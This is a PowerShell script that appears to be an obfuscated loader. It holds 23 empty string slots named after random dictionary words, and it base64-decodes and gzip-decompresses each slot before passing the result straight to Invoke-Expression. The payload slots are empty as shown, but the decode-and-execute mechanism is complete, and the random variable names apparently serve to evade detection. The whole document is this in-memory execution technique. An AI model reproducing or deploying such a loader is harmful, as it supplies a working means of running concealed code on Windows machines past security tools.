#Requires -Version 2

$Scrounging = ""
$Astronomic = ""
$Armistices = ""
$Mightiness = ""
$Straitened = ""
$Recitation = ""
$Herbicides = ""
$Coalitions = ""
$Condensing = ""
$Casseroles = ""
$Enchanters = ""
$Fireproofs = ""
$Repudiates = ""
$Maidenhood = ""
$Tortuously = ""
$Harrisburg = ""
$Puritanism = ""
$Militaries = ""
$Adjudicate = ""
$Calculated = ""
$Promethean = ""
$Mezzanines = ""
$Upchucking = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Scrounging,$Astronomic,$Armistices,$Mightiness,$Straitened,$Recitation,$Herbicides,$Coalitions,$Condensing,$Casseroles,$Enchanters,$Fireproofs,$Repudiates,$Maidenhood,$Tortuously,$Harrisburg,$Puritanism,$Militaries,$Adjudicate,$Calculated,$Promethean,$Mezzanines,$Upchucking)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
